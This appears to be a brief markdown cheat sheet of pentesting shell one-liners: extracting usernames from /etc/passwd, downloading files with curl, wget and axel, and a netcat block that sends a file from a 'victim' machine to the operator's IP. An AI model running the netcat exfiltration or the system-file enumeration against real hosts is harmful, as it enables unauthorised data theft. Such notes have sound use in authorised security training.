![image](https://user-images.githubusercontent.com/68326057/118384023-9df1a480-b620-11eb-812f-4104c1d11d65.png)


# Cut

To grep Only Usernames:-

```bash
cat /etc/passwd | grep bash | cut -d ":" -f 1
```

# To Download FILEs


## CURL
```bash
curl -O url
```

## WGET
```bash
wget url -o output
```

## axel
```bash
axel -a -n 20 -o output url
```

## nc

```bash
My machine 
sudo nc -l -p 999 > file

On Victim
nc.exe -w 5 MYIP 999 < file
```
